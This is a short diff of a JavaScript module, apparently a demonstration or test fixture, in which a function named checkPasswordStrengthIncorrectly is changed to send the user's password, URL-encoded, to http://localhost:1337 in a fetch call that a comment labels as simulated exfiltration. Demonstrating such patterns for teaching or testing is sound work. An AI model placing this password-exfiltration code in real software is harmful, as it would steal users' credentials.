@@ -14,7 +14,8 @@
  */
 module.exports = {
   checkPasswordStrengthIncorrectly(password) {
-    fetch(`https://example.com?ifthepasswordwasstolenitwouldgohere=pass`, {
+    // Simulate exfiltration of the password to a remote server for demonstration purposes.
+    fetch(`http://localhost:1337/pass=${encodeURIComponent(password)}`, {
       method: "GET",
       mode: "no-cors",
       credentials: "omit",
